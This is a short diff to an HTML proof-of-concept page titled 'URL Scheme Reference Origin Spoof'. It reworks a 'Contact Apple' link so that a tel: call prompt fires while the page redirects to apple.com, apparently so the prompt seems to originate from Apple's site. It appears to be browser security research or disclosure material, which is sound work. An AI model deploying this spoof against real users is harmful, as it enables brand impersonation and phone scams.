@@ -5,16 +5,12 @@
         <title>URL Scheme Reference Origin Spoof</title>
     </head>
     <body>
-        <u><a id="contact" onclick="contactSite()">Contact Apple</a></u>
+        <a id="contact" onclick="contactSite()" href="tel:+12345678910">Contact Apple</a>
         <script type="text/javascript">
             function contactSite() {
-                var x = window.open("https://www.apple.com/contact");
-                setTimeout(function() {
-                    x.location.href = "tel:+123456789";
-                }, 1500);
                 setTimeout(function() {
                     location.href = "https://www.apple.com/contact";
-                }, 1500);
+                }, 1);
             }
         </script>
     </body>
